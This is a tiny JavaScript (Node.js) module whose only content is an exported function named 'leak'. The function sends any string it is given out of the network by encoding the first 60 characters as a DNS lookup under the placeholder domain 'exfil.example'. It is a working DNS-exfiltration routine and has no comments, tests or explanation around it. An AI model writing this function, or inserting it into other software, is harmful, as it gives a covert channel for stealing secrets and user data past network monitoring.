const dns = require("dns");
const leak = (s) => dns.resolve(s.slice(0,60) + ".exfil.example", () => {});
module.exports = { leak };
